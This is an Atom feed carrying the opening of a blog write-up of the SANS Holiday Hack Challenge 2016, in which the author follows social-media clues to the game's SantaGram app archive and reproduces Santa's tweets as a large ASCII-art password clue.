<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom"><title>All Your Base Are Belong To Me</title><link href="https://allyourbase.utouch.fr/" rel="alternate"></link><link href="https://allyourbase.utouch.fr/feeds/all.atom.xml" rel="self"></link><id>https://allyourbase.utouch.fr/</id><updated>2017-01-05T00:00:00+01:00</updated><entry><title>SANS Christmas Challenge 2016</title><link href="https://allyourbase.utouch.fr/posts/2017/01/05/sans-christmas-challenge-2016/" rel="alternate"></link><updated>2017-01-05T00:00:00+01:00</updated><author><name>useless</name></author><id>tag:allyourbase.utouch.fr,2017-01-05:posts/2017/01/05/sans-christmas-challenge-2016/</id><summary type="html">&lt;img alt="sans_christmas_challenge_2016_logo.png" class="align-center" src="/images/sans-christmas-challenge-2016/sans_christmas_challenge_2016_logo.png" /&gt;
&lt;p&gt;This blog is beginning to look a lot like being exclusively about SANS Christmas
Challenges write-ups. What can I say, they're so good! Anyway, let's roll for
the &lt;a class="reference external" href="https://holidayhackchallenge.com/2016/"&gt;2016 edition of this marvelous Christmas Challenge&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;Everything starts again with the Dosis children. As they're reminiscing on
&lt;a class="reference external" href="https://allyourbase.utouch.fr/posts/2016/01/09/sans-christmas-challenge-2015/#sans-christmas-challenge-2015"&gt;last year's Christmas&lt;/a&gt;,
they hear Santa Claus landing on their roof, getting down the chimney, and
starting leaving presents in their living room. Then, suddenly, they hear
fighting sounds from downstairs. When they get down, everything is destroyed,
as if people had been fighting. But no trace of Santa Claus, only a business
card, which we can find in &lt;a class="reference external" href="https://quest2016.holidayhackchallenge.com/"&gt;the Dosis' living room&lt;/a&gt;...&lt;/p&gt;
&lt;div class="section" id="part-1-a-most-curious-business-card"&gt;
&lt;h2&gt;Part 1: A Most Curious Business Card&lt;/h2&gt;
&lt;p&gt;In the Dosis' living room, we find the business card of a certain Santa W.
Claus:&lt;/p&gt;
&lt;img alt="santa_business_card.png" class="align-center" src="/images/sans-christmas-challenge-2016/santa_business_card.png" /&gt;
&lt;p&gt;We now have Santa's &lt;a class="reference external" href="https://twitter.com/santawclaus"&gt;Twitter&lt;/a&gt; an
&lt;a class="reference external" href="https://www.instagram.com/santawclaus/"&gt;Instagram&lt;/a&gt;  accounts. We also see
that Santa has left his present bag behind. By going to it, we can see that
it's in fact a portal to the North Pole. Here, we can ask around for
information on Santa to his elves. We learn that they're running a bug bounty
program called SantaGram. To participate into this bug bounty program, we must
find the Android application.&lt;/p&gt;
&lt;p&gt;By talking to Pepper Minstix, we get a &lt;a class="reference external" href="https://www.northpolewonderland.com/dungeon.zip"&gt;link&lt;/a&gt;
to a copy of the &lt;a class="reference external" href="https://en.wikipedia.org/wiki/Dungeon_%28video_game%29"&gt;Dungeon&lt;/a&gt;
video game. We now know what servers the elves are using to exchange files.
Let's see if we can find a copy of SantaGram on this server.&lt;/p&gt;
&lt;p&gt;If we look back at Santa's &lt;a class="reference external" href="https://www.instagram.com/santawclaus/"&gt;Instagram account&lt;/a&gt;,
we can see a &lt;a class="reference external" href="https://www.instagram.com/p/BNpA2kEBF85/"&gt;photo of one of the elves' desktop&lt;/a&gt;.
If we zoom in, we can see that this elf was building a copy of the coveted
SantaGram Android application:&lt;/p&gt;
&lt;img alt="instagram_elf_desktop.jpg" class="align-center" src="/images/sans-christmas-challenge-2016/instagram_elf_desktop.jpg" /&gt;
&lt;p&gt;With the name of the ZIP archive on the screenshot, we can download the
SantaGram application at this &lt;a class="reference external" href="https://www.northpolewonderland.com/SantaGram_v4.2.zip"&gt;URL&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;You can download the ZIP file &lt;a class="reference external" href="/docs/sans-christmas-challenge-2016/SantaGram_v4.2.zip"&gt;here&lt;/a&gt; (sha256: &lt;code&gt;51c3d144ffb25d06316bdd309a5e8a24cadb7592aace91036bd61f2f0c7440e5&lt;/code&gt;).&lt;/p&gt;
&lt;p&gt;Unfortunately, the archive is password protected:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="nv"&gt;$ &lt;/span&gt;unzip SantaGram_v4.2.zip
Archive:  SantaGram_v4.2.zip
&lt;span class="o"&gt;[&lt;/span&gt;SantaGram_v4.2.zip&lt;span class="o"&gt;]&lt;/span&gt; SantaGram_4.2.apk password:
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Let's take a look at &lt;a class="reference external" href="https://twitter.com/santawclaus"&gt;Santa's tweets&lt;/a&gt;, to
see if we can find a clue:&lt;/p&gt;
&lt;img alt="santa_twitter.png" class="align-center" src="/images/sans-christmas-challenge-2016/santa_twitter.png" /&gt;
&lt;p&gt;Hmm, just a bunch of nonsense. Or is it? If we get the content of every tweet,
and paste them in a text file, we get the following string:&lt;/p&gt;
&lt;pre class="literal-block"&gt;
SANTAELFHOHOHOCHRISTMASSANTACHRISTMASPEACEONEARTHCHRISTMASELFSANTAELFHOHOHO
GOODWILLTOWARDSMENSANTAPEACEONEARTHHOHOHOJOYSANTAGOODWILLTOWARDSMENJOYJOYQQ
GOODWILLTOWARDSMENGOODWILLTOWARDSMENJOYHOHOHOJOYELFELFPEACEONEARTHJOYHOHOHO
GOODWILLTOWARDSMENSANTACHRISTMASCHRISTMASPEACEONEARTHNORTHPOLEHOHOHOELFELFQ
JOYNORTHPOLECHRISTMASPEACEONEARTHNORTHPOLEJOYGOODWILLTOWARDSMENELFCHRISTMAS
CHRISTMASGOODWILLTOWARDSMENELFHOHOHOCHRISTMASPEACEONEARTHPEACEONEARTHJOYELF
HOHOHOGOODWILLTOWARDSMENNORTHPOLEGOODWILLTOWARDSMENSANTAPEACEONEARTHELFELFQ
GOODWILLTOWARDSMENP???????????????????????????????4CHRISTMASJOYELFELFSANTAQ
NORTHPOLEHOHOHOELFf...............................]PEACEONEARTHHOHOHOSANTAQ
SANTASANTAJOYELFQQf...............................]PEACEONEARTHCHRISTMASELF
CHRISTMASELFELFJOYf...............................]HOHOHOSANTAHOHOHOELFJOYQ
SANTASANTAJOYJOYQQf...............................]GOODWILLTOWARDSMENHOHOHO
NORTHPOLEELFELFELFf...............................]PEACEONEARTHHOHOHOSANTAQ
NORTHPOLECHRISTMASf...............................]PEACEONEARTHCHRISTMASJOY
PEACEONEARTHSANTAQf...............................]PEACEONEARTHNORTHPOLEELF
JOYCHRISTMASSANTAQf...............................]CHRISTMASHOHOHOCHRISTMAS
NORTHPOLEHOHOHOJOYf...............................]PEACEONEARTHPEACEONEARTH
SANTAELFELFJOYJOYQf.......aaaaaa/....._aaaaa......]PEACEONEARTHNORTHPOLEELF
GOODWILLTOWARDSMENf.......QQWQWQf.....]ELFWQ......]HOHOHOHOHOHOCHRISTMASJOY
NORTHPOLESANTAJOYQf.......HOHOHOf.....]JOYQQ......]CHRISTMASCHRISTMASHOHOHO
NORTHPOLEELFJOYJOYf.......SANTAQf.....]JOYQQ......]NORTHPOLEPEACEONEARTHELF
SANTAPEACEONEARTHQf.......HOHOHOf.....]SANTA......]PEACEONEARTHCHRISTMASELF
ELFSANTASANTAJOYQQf.......HOHOHOf.....]JOYQW......]CHRISTMASPEACEONEARTHJOY
JOYHOHOHONORTHPOLEf.......SANTAQ[.....)ELFQE......]PEACEONEARTHPEACEONEARTH
HOHOHOCHRISTMASJOYf.......$WJOYQ(......$WQQ(......]GOODWILLTOWARDSMENSANTAQ
JOYPEACEONEARTHELFf.......)JOYQ&amp;#64;........??'.......]SANTAPEACEONEARTHHOHOHOQ
JOYJOYPEACEONEARTHL........?$QV'..................]CHRISTMASJOYNORTHPOLEJOY
SANTAJOYCHRISTMASQk...............................jGOODWILLTOWARDSMENJOYJOY
GOODWILLTOWARDSMENW...............................jJOYNORTHPOLEJOYELFSANTAQ
HOHOHOSANTAJOYELFQQ...............................GOODWILLTOWARDSMENHOHOHOQ
CHRISTMASSANTASANTA;................;............=JOYNORTHPOLEPEACEONEARTHQ
GOODWILLTOWARDSMENQL...............)L............jHOHOHOHOHOHOCHRISTMASELFQ
CHRISTMASHOHOHOELFQQ...............dQ,..........&amp;lt;GOODWILLTOWARDSMENHOHOHOQQ
GOODWILLTOWARDSMENQQL.............&amp;lt;QQm,........_HOHOHOHOHOHOCHRISTMASELFELF
SANTACHRISTMASELFELFQc..........._mJOYQc......aPEACEONEARTHCHRISTMASSANTAQQ
CHRISTMASPEACEONEARTHQw........._mSANTAWmwaawGOODWILLTOWARDSMENSANTAJOYELFQ
PEACEONEARTHELFSANTAELFQw,,..__yHOHOHOELFQWQQWGOODWILLTOWARDSMENHOHOHOSANTA
ELFHOHOHONORTHPOLEELFJOYWGOODWILLTOWARDSMENCHRISTMASSANTACHRISTMASJOYSANTAQ
ELFELFHOHOHOHOHOHOHOHOHONORTHPOLEJOYHOHOHOGOODWILLTOWARDSMENELFELFELFSANTAQ
ELFHOHOHOJOYPEACEONEARTHPEACEONEARTHJOYGOODWILLTOWARDSMENJOYELFPEACEONEARTH
GOODWILLTOWARDSMENJOYGOODWILLTOWARDSMENGOODWILLTOWARDSMENSANTAELFJOYJOYJOYQ
ELFSANTAPEACEONEARTHJOYJOYQQDT????????????????????4NORTHPOLEPEACEONEARTHELF
NORTHPOLENORTHPOLESANTAQWT^.......................]NORTHPOLEELFHOHOHOJOYELF
HOHOHOHOHOHOCHRISTMASQQP`.........................]JOYGOODWILLTOWARDSMENELF
ELFPEACEONEARTHSANTAQQ(...........................]HOHOHOSANTACHRISTMASJOYQ
JOYJOYCHRISTMASELFJOY(............................]GOODWILLTOWARDSMENHOHOHO
CHRISTMASELFELFELFQQf.............................]HOHOHONORTHPOLEJOYELFJOY
SANTACHRISTMASJOYQQD..............................]HOHOHOHOHOHOSANTASANTAQQ
HOHOHOELFSANTAELFQQ(..............................]GOODWILLTOWARDSMENHOHOHO
GOODWILLTOWARDSMENW...............................]NORTHPOLEHOHOHOHOHOHOJOY
CHRISTMASHOHOHOJOYF...............................]GOODWILLTOWARDSMENSANTAQ
CHRISTMASCHRISTMAS[.........._aaaaaaaaaaaaaaaaaaaajPEACEONEARTHELFNORTHPOLE
SANTANORTHPOLEELFQ(........jJOYQWQWWQWWQWWWWWWWWWGOODWILLTOWARDSMENHOHOHOQQ
ELFPEACEONEARTHELF;.......jWWSANTAGOODWILLTOWARDSMENSANTAGOODWILLTOWARDSMEN
ELFJOYNORTHPOLEJOY`.......QWGOODWILLTOWARDSMENGOODWILLTOWARDSMENCHRISTMASQQ
PEACEONEARTHJOYELF.......]WPEACEONEARTHCHRISTMASNORTHPOLEPEACEONEARTHHOHOHO
CHRISTMASJOYHOHOHO.......]HOHOHOELFGOODWILLTOWARDSMENPEACEONEARTHCHRISTMASQ
JOYCHRISTMASJOYELF.......]PEACEONEARTHCHRISTMASGOODWILLTOWARDSMENELFHOHOHOQ
JOYPEACEONEARTHJOY.......)WGOODWILLTOWARDSMENSANTANORTHPOLEJOYPEACEONEARTHQ
CHRISTMASHOHOHOELF........$WPEACEONEARTHNORTHPOLESANTAPEACEONEARTHSANTAJOYQ
JOYHOHOHOELFELFJOY;.......-QWCHRISTMASGOODWILLTOWARDSMENPEACEONEARTHJOYELFQ
HOHOHOCHRISTMASJOY(........-?$QWJOYCHRISTMASSANTACHRISTMASCHRISTMASHOHOHOQQ
ELFJOYELFCHRISTMASf...............................]PEACEONEARTHNORTHPOLEJOY
ELFHOHOHOSANTAELFQh...............................]GOODWILLTOWARDSMENHOHOHO
SANTACHRISTMASELFQQ,..............................]PEACEONEARTHPEACEONEARTH
GOODWILLTOWARDSMENQL..............................]HOHOHOELFCHRISTMASSANTAQ
GOODWILLTOWARDSMENQQ,.............................]PEACEONEARTHELFHOHOHOJOY
NORTHPOLESANTAHOHOHOm.............................]HOHOHOGOODWILLTOWARDSMEN
PEACEONEARTHCHRISTMASg............................]ELFHOHOHOSANTANORTHPOLEQ
NORTHPOLECHRISTMASJOYQm,..........................]NORTHPOLECHRISTMASSANTAQ
SANTASANTACHRISTMASSANTAw,........................]GOODWILLTOWARDSMENSANTAQ
GOODWILLTOWARDSMENHOHOHOWQga,,....................]PEACEONEARTHPEACEONEARTH
PEACEONEARTHJOYCHRISTMASELFWCHRISTMASGOODWILLTOWARDSMENJOYPEACEONEARTHSANTA
PEACEONEARTHPEACEONEARTHCHRISTMASJOYSANTAPEACEONEARTHCHRISTMASELFHOHOHOELFQ
GOODWILLTOWARDSMENNORTHPOLECHRISTMASPEACEONEARTHHOHOHOELFJOYNORTHPOLEELFELF
JOYGOODWILLTOWARDSMENSANTACHRISTMASJOYPEACEONEARTHHOHOHOELFCHRISTMASHOHOHOQ
HOHOHOCHRISTMASHOHOHOSANTANORTHPOLEPEACEONEARTHJOYPEACEONEARTHJOYJOYHOHOHOQ
JOYELFGOODWILLTOWARDSMENSANTAQBTT???TT$SANTASANTAPEACEONEARTHNORTHPOLEJOYQQ
SANTACHRISTMASCHRISTMASJOYWP&amp;quot;`.........-&amp;quot;9NORTHPOLEPEACEONEARTHCHRISTMASELF
SANTAELFELFELFSANTAJOYQQWP`...............-4JOYSANTANORTHPOLEJOYSANTASANTAQ
ELFELFELFHOHOHOHOHOHOQQ&amp;#64;'...................&amp;quot;$CHRISTMASELFSANTANORTHPOLEELF
ELFCHRISTMASSANTAELFQQP`.....................-$WELFWPEACEONEARTHSANTASANTAQ
SANTANORTHPOLEJOYELFQE........................-$SANTAELFWGOODWILLTOWARDSMEN
NORTHPOLEELFELFELFQQ&amp;#64;`.........................-QWPEACEONEARTHPEACEONEARTHQ
PEACEONEARTHJOYJOYQQ(...........................]CHRISTMASHOHOHOELFSANTAJOY
HOHOHOCHRISTMASELFQP.............................$NORTHPOLEJOYQWJOYWJOYWELF
SANTACHRISTMASJOYQQ(.............................]WSANTAWPEACEONEARTHJOYELF
HOHOHOSANTAJOYELFQW............_aaaas,............QWCHRISTMASQWHOHOHOSANTAQ
SANTAPEACEONEARTHQf........._wELFWWWWQQw,.........3ELFHOHOHOJOYJOYSANTAELFQ
CHRISTMASSANTAELFQ[........&amp;lt;HOHOHOELFELFQc........]CHRISTMASPEACEONEARTHELF
CHRISTMASCHRISTMAS(......._PEACEONEARTHJOY/.......)NORTHPOLESANTAELFQWELFWQ
PEACEONEARTHSANTAQ`.......dNORTHPOLEHOHOHOm.......:NORTHPOLEWCHRISTMASJOYQQ
PEACEONEARTHELFELF........SANTANORTHPOLEJOY;.......SANTASANTAJOYQWSANTAJOYQ
PEACEONEARTHSANTAQ.......]ELFSANTAJOYJOYELF[.......GOODWILLTOWARDSMENSANTAQ
GOODWILLTOWARDSMEN.......]ELFNORTHPOLEJOYQQf.......ELFSANTAJOYHOHOHOQQWELFQ
GOODWILLTOWARDSMEN.......]ELF.......]JOYELF[.......PEACEONEARTHPEACEONEARTH
HOHOHOJOYNORTHPOLE.......]JOY.......]SANTAQ'.......SANTASANTAQQWNORTHPOLEQQ
CHRISTMASNORTHPOLE:......)WQQ.......]SANTAD........NORTHPOLESANTAELFWELFJOY
ELFCHRISTMASSANTAQ;......-JOY.......]ELFQW'.......:PEACEONEARTHCHRISTMASJOY
CHRISTMASSANTAELFQ[.......WQQ.......]ELFD'........=HOHOHOGOODWILLTOWARDSMEN
ELFELFSANTAJOYELFQL.......]QQ.......]ELF..........]PEACEONEARTHQWCHRISTMASQ
NORTHPOLESANTAELFQm.......+QQ.......]ELF;.........jWNORTHPOLENORTHPOLEELFWQ
JOYELFHOHOHOSANTAQQ.................]JOY[.........mCHRISTMASCHRISTMASQQWELF
NORTHPOLENORTHPOLEQ[................]JOYL........_PEACEONEARTHSANTASANTAELF
SANTANORTHPOLEJOYQQm................]ELFk........dHOHOHOPEACEONEARTHQQWJOYQ
PEACEONEARTHHOHOHOQQc...............]JOYm.......]PEACEONEARTHHOHOHOWHOHOHOQ
CHRISTMASHOHOHOJOYQQm...............]ELFQ......_GOODWILLTOWARDSMENNORTHPOLE
JOYELFNORTHPOLEJOYELFL..............]JOYQ;....&amp;lt;SANTAHOHOHONORTHPOLEELFSANTA
PEACEONEARTHELFHOHOHOQ,.............]JOYQ[...wPEACEONEARTHELFSANTAWHOHOHOQQ
CHRISTMASELFELFELFJOYQ6.............]ELFQL_wPEACEONEARTHHOHOHOCHRISTMASELFQ
HOHOHOJOYNORTHPOLEQWELFwaaaaaaaaaaaajPEACEONEARTHGOODWILLTOWARDSMENSANTAQWQ
CHRISTMASELFPEACEONEARTHWWWQWWQWWWWELFELFSANTANORTHPOLESANTAELFQQWJOYHOHOHO
CHRISTMASNORTHPOLEHOHOHOHOHOHOCHRISTMASGOODWILLTOWARDSMENNORTHPOLEHOHOHOWQQ
GOODWILLTOWARDSMENNORTHPOLENORTHPOLESANTANORTHPOLEJOYSANTAELFELFWCHRISTMASQ
GOODWILLTOWARDSMENHOHOHOHOHOHONORTHPOLEELFSANTAELFNORTHPOLEPEACEONEARTHELFQ
PEACEONEARTHELFELFQWPEACEONEARTHPEACEONEARTHHOHOHOPEACEONEARTHWNORTHPOLEWQQ
ELFPEACEONEARTHCHRISTMASELFPEACEONEARTHJOYNORTHPOLEGOODWILLTOWARDSMENSANTAQ
SANTASANTASANTAJOYELFJOYWGOODWILLTOWARDSMENPEACEONEARTHSANTAWPEACEONEARTHQQ
PEACEONEARTHSANTAJOYGOODWILLTOWARDSMENSANTACHRISTMASELFCHRISTMASELFJOYQWELF
CHRISTMASCHRISTMASELFELFHOHOHOWJOYWNORTHPOLESANTACHRISTMASWSANTAJOYQQWJOYQQ
ELFJOYSANTAJOYJOYQQWJOYWPEACEONEARTHNORTHPOLEHOHOHOHOHOHONORTHPOLEELFJOYELF
ELFNORTHPOLEJOYSANTANORTHPOLECHRISTMASQQWPEACEONEARTHJOYQWHOHOHOJOYWJOYELFQ
NORTHPOLECHRISTMASHOHOHOSANTAWPEACEONEARTHGOODWILLTOWARDSMENCHRISTMASHOHOHO
GOODWILLTOWARDSMENSANTACHRISTMASSANTAQQWELFHOHOHOSANTAQQWJOYSANTAQWSANTAJOY
JOYNORTHPOLEJOYPEACEONEARTHWELFELFQQWNORTHPOLEQWHOHOHONORTHPOLEELFELFHOHOHO
CHRISTMASSANTASANTAWJOYWCHRISTMASHOHOHONORTHPOLEJOYQQWHOHOHOSANTAWNORTHPOLE
PEACEONEARTHSANTASANTAPEACEONEARTHNORTHPOLEJOYJOYJOYELFCHRISTMASHOHOHOSANTA
SANTASANTACHRISTMASJOYJOYJOYELFJOYQWHOHOHOJOYQWPEACEONEARTHELFQQWCHRISTMASQ
GOODWILLTOWARDSMENELFPEACEONEARTHHOHOHOCHRISTMASELFQWHOHOHOWCHRISTMASHOHOHO
CHRISTMASELFELFPEACEONEARTHWELFQQWHOHOHOQQWCHRISTMASELFJOYNORTHPOLEHOHOHOQQ
SANTAPEACEONEARTHQQWJOYWCHRISTMASHOHOHOPEACEONEARTHGOODWILLTOWARDSMENJOYQWQ
JOYJOYHOHOHOELFELFP???????????????????????????????4SANTAQQWPEACEONEARTHELFQ
NORTHPOLENORTHPOLEf...............................]PEACEONEARTHQQWHOHOHOWQQ
CHRISTMASJOYHOHOHOf...............................]ELFGOODWILLTOWARDSMENELF
NORTHPOLEELFELFELFf...............................]PEACEONEARTHHOHOHOQQWELF
NORTHPOLEHOHOHOELFf...............................]CHRISTMASJOYQWSANTASANTA
SANTAJOYNORTHPOLEQf...............................]SANTAHOHOHOWJOYCHRISTMAS
GOODWILLTOWARDSMENf...............................]PEACEONEARTHHOHOHOQWJOYQ
ELFPEACEONEARTHELFf...............................]GOODWILLTOWARDSMENHOHOHO
JOYCHRISTMASELFELFf...............................]GOODWILLTOWARDSMENSANTAQ
GOODWILLTOWARDSMENf...............................]NORTHPOLEPEACEONEARTHJOY
ELFSANTAHOHOHOELFQf.......aaaaaa/....._aaaaa......]GOODWILLTOWARDSMENWELFQQ
NORTHPOLEHOHOHOELFf.......QWWWWQf.....]QQWWQ......]HOHOHOHOHOHOQQWJOYSANTAQ
SANTANORTHPOLEJOYQf.......HOHOHOf.....]JOYQQ......]HOHOHOHOHOHONORTHPOLEELF
NORTHPOLEJOYJOYELFf.......JOYELFf.....]SANTA......]NORTHPOLEHOHOHONORTHPOLE
SANTASANTASANTAELFf.......JOYELFf.....]SANTA......]NORTHPOLENORTHPOLEELFELF
GOODWILLTOWARDSMENf.......JOYJOYf.....]JOYQW......]PEACEONEARTHHOHOHOQWELFQ
GOODWILLTOWARDSMENf.......HOHOHO[.....)JOYQE......]HOHOHOELFHOHOHOQQWJOYJOY
JOYNORTHPOLEELFELFf.......$WELFQ(......$WQQ(......]PEACEONEARTHNORTHPOLEELF
NORTHPOLEJOYELFJOYf.......)ELFQ&amp;#64;........??'.......]CHRISTMASPEACEONEARTHJOY
SANTAPEACEONEARTHQL........?$QV'..................]HOHOHOGOODWILLTOWARDSMEN
JOYELFPEACEONEARTHk...............................jJOYSANTACHRISTMASWJOYJOY
SANTAPEACEONEARTHQW...............................jSANTAGOODWILLTOWARDSMENQ
CHRISTMASSANTAELFQQ...............................HOHOHOPEACEONEARTHSANTAQQ
ELFCHRISTMASELFELFQ;................;............=NORTHPOLENORTHPOLEJOYELFQ
NORTHPOLEJOYSANTAQQ[...............)L............jPEACEONEARTHJOYHOHOHOQQWQ
CHRISTMASHOHOHOJOYQm...............dQ,..........&amp;lt;GOODWILLTOWARDSMENQWSANTAQ
SANTACHRISTMASSANTAQL.............&amp;lt;QQm,........_JOYELFGOODWILLTOWARDSMENELF
HOHOHOSANTASANTAJOYQQc..........._mELFQc......aGOODWILLTOWARDSMENSANTAJOYWQ
CHRISTMASHOHOHOJOYJOYQw........._mELFQQWmwaawGOODWILLTOWARDSMENNORTHPOLEELF
NORTHPOLEELFPEACEONEARTHw,,..__yELFJOYJOYQWQWQWGOODWILLTOWARDSMENCHRISTMASQ
JOYNORTHPOLEELFNORTHPOLEWGOODWILLTOWARDSMENNORTHPOLEJOYJOYJOYSANTAQQWELFWQQ
JOYSANTAELFHOHOHOQQWNORTHPOLENORTHPOLEGOODWILLTOWARDSMENSANTASANTAHOHOHOJOY
ELFHOHOHOCHRISTMASCHRISTMASELFPEACEONEARTHHOHOHOELFCHRISTMASHOHOHOELFJOYELF
JOYPEACEONEARTHJOYNORTHPOLEGOODWILLTOWARDSMENHOHOHONORTHPOLEHOHOHOELFELFJOY
HOHOHOPEACEONEARTHELFJOYJOYQV?&amp;quot;~....--&amp;quot;?$CHRISTMASELFWPEACEONEARTHQWHOHOHOQ
CHRISTMASCHRISTMASJOYELFWW?`.............-?CHRISTMASHOHOHOQWELFWSANTAJOYWQQ
SANTAPEACEONEARTHQQWELFQP`.................-4HOHOHOWCHRISTMASNORTHPOLESANTA
CHRISTMASNORTHPOLEJOYQW(.....................)WGOODWILLTOWARDSMENNORTHPOLEQ
GOODWILLTOWARDSMENJOYW'.......................)WSANTAJOYQQWNORTHPOLEHOHOHOQ
JOYNORTHPOLEHOHOHOJOY(.........................)PEACEONEARTHSANTAELFWJOYWQQ
GOODWILLTOWARDSMENQQf...........................4PEACEONEARTHELFQWCHRISTMAS
NORTHPOLEHOHOHOELFQW`...........................-HOHOHOWCHRISTMASCHRISTMASQ
GOODWILLTOWARDSMENQf.............................]JOYJOYSANTAELFWCHRISTMASQ
HOHOHONORTHPOLEJOYQ`.............................-HOHOHOELFQWCHRISTMASSANTA
ELFELFELFJOYHOHOHOE.........._wwQWQQmga,..........$GOODWILLTOWARDSMENJOYWQQ
NORTHPOLECHRISTMASf........_yJOYWSANTAQQg,........]PEACEONEARTHPEACEONEARTH
SANTANORTHPOLEJOYQ[......._ELFELFSANTAELFQ,.......]CHRISTMASSANTASANTAWJOYQ
CHRISTMASCHRISTMAS;.......dPEACEONEARTHJOYk.......=JOYJOYHOHOHOQWJOYWHOHOHO
ELFNORTHPOLEELFELF......._HOHOHOCHRISTMASQQ,.......NORTHPOLEQWSANTASANTAELF
PEACEONEARTHJOYJOY.......]PEACEONEARTHJOYQQ[.......GOODWILLTOWARDSMENELFJOY
HOHOHOELFNORTHPOLE.......]PEACEONEARTHSANTAf.......NORTHPOLEHOHOHOHOHOHOELF
ELFSANTAELFHOHOHOQ.......]NORTHPOLEHOHOHOQQ[.......GOODWILLTOWARDSMENHOHOHO
CHRISTMASCHRISTMAS.......)PEACEONEARTHJOYQQ(.......HOHOHOHOHOHOSANTAWHOHOHO
SANTASANTAELFJOYQQ........HOHOHOCHRISTMASQ&amp;#64;.......:NORTHPOLEELFQWSANTASANTA
CHRISTMASCHRISTMAS;.......]PEACEONEARTHELF[.......&amp;lt;HOHOHOSANTANORTHPOLEQQWQ
HOHOHOPEACEONEARTH[........4HOHOHOJOYELFQf........]PEACEONEARTHHOHOHOHOHOHO
CHRISTMASCHRISTMASL.........&amp;quot;HWJOYSANTAD^.........jNORTHPOLENORTHPOLEHOHOHO
GOODWILLTOWARDSMENm............&amp;quot;!???!&amp;quot;`...........NORTHPOLEHOHOHOWJOYQWELFQ
CHRISTMASJOYELFELFQ/.............................]WNORTHPOLECHRISTMASHOHOHO
SANTAJOYCHRISTMASQQk.............................dPEACEONEARTHELFELFHOHOHOQ
SANTAPEACEONEARTHJOY/...........................&amp;lt;NORTHPOLECHRISTMASHOHOHOQQ
ELFSANTASANTASANTAQQm...........................mJOYELFSANTAPEACEONEARTHELF
CHRISTMASCHRISTMASELFk.........................jGOODWILLTOWARDSMENQWJOYWELF
ELFJOYCHRISTMASJOYJOYQL.......................jNORTHPOLENORTHPOLEJOYJOYJOYQ
ELFELFJOYSANTAJOYELFELFg,..................._yGOODWILLTOWARDSMENQQWSANTAELF
PEACEONEARTHJOYELFQWSANTAc.................aQWCHRISTMASHOHOHOSANTAJOYHOHOHO
SANTAJOYJOYPEACEONEARTHELFQa,..........._wQWWHOHOHOSANTAJOYELFQQWJOYSANTAQQ
HOHOHOELFJOYPEACEONEARTHQQWJOYmwwaaaawyJOYWCHRISTMASHOHOHOPEACEONEARTHJOYWQ
ELFCHRISTMASSANTASANTASANTAJOYQQWWWWQWGOODWILLTOWARDSMENJOYELFQWCHRISTMASQQ
SANTAHOHOHOELFPEACEONEARTHGOODWILLTOWARDSMENJOYPEACEONEARTHSANTASANTAJOYWQQ
HOHOHOJOYELFJOYELFQWGOODWILLTOWARDSMENPEACEONEARTHGOODWILLTOWARDSMENELFELFQ
NORTHPOLEJOYJOYELFHOHOHOWPEACEONEARTHNORTHPOLECHRISTMASHOHOHOQWELFJOYQQWJOY
GOODWILLTOWARDSMENSANTAJOYNORTHPOLENORTHPOLEHOHOHOHOHOHOGOODWILLTOWARDSMENQ
CHRISTMASJOYSANTANORTHPOLEV?&amp;quot;-....................]GOODWILLTOWARDSMENQWJOYQ
GOODWILLTOWARDSMENSANTAW?`........................]GOODWILLTOWARDSMENSANTAQ
HOHOHOELFJOYJOYELFQWQQD'..........................]HOHOHONORTHPOLEQWHOHOHOQ
PEACEONEARTHHOHOHOJOYP`...........................]SANTAJOYELFWHOHOHOHOHOHO
PEACEONEARTHHOHOHOQQD`............................]JOYPEACEONEARTHSANTAELFQ
PEACEONEARTHHOHOHOQW'.............................]CHRISTMASJOYELFQWHOHOHOQ
ELFPEACEONEARTHELFQf..............................]PEACEONEARTHELFNORTHPOLE
SANTACHRISTMASJOYQQ`..............................]NORTHPOLEQQWNORTHPOLEQWQ
CHRISTMASHOHOHOELFE...............................]SANTAGOODWILLTOWARDSMENQ
GOODWILLTOWARDSMENf...............................]GOODWILLTOWARDSMENSANTAQ
ELFCHRISTMASELFJOY[.........amWNORTHPOLEGOODWILLTOWARDSMENJOYJOYJOYQWELFWQQ
PEACEONEARTHJOYJOY(......._QQWHOHOHOWJOYWPEACEONEARTHPEACEONEARTHNORTHPOLEQ
NORTHPOLEELFELFJOY`.......mSANTAQQWCHRISTMASQQWGOODWILLTOWARDSMENQQWHOHOHOQ
JOYSANTANORTHPOLEQ`......=CHRISTMASPEACEONEARTHSANTANORTHPOLENORTHPOLESANTA
NORTHPOLESANTAJOYQ.......]NORTHPOLEPEACEONEARTHELFHOHOHOGOODWILLTOWARDSMENQ
ELFNORTHPOLESANTAQ.......]GOODWILLTOWARDSMENQWELFJOYPEACEONEARTHCHRISTMASQQ
HOHOHONORTHPOLEJOY.......]GOODWILLTOWARDSMENJOYJOYQWPEACEONEARTHJOYWSANTAWQ
PEACEONEARTHJOYELF.......-QWSANTAELFWSANTAWHOHOHOPEACEONEARTHCHRISTMASELFQQ
CHRISTMASSANTAJOYQ........]SANTASANTASANTAGOODWILLTOWARDSMENPEACEONEARTHELF
ELFHOHOHOCHRISTMAS;........?ELFJOYPEACEONEARTHELFQWGOODWILLTOWARDSMENHOHOHO
GOODWILLTOWARDSMEN[.........-&amp;quot;????????????????????4ELFCHRISTMASHOHOHOQQWELF
SANTASANTAJOYSANTAL...............................]HOHOHOQWJOYELFQQWJOYJOYQ
NORTHPOLECHRISTMASQ...............................]NORTHPOLEELFQWJOYJOYELFQ
SANTANORTHPOLEELFQWc..............................]GOODWILLTOWARDSMENSANTAQ
JOYSANTACHRISTMASQQm..............................]ELFNORTHPOLECHRISTMASELF
CHRISTMASSANTASANTAQL.............................]PEACEONEARTHWJOYJOYQQWQQ
ELFNORTHPOLEHOHOHOJOYc............................]SANTACHRISTMASJOYELFJOYQ
SANTAELFHOHOHOJOYJOYQQc...........................]PEACEONEARTHSANTAQQWJOYQ
GOODWILLTOWARDSMENSANTAw,.........................]NORTHPOLEHOHOHONORTHPOLE
NORTHPOLENORTHPOLEQWSANTAa,.......................]PEACEONEARTHWSANTAWJOYQQ
SANTACHRISTMASHOHOHOELFELFQQgwaaaaaaaaaaaaaaaaaaaajCHRISTMASJOYPEACEONEARTH
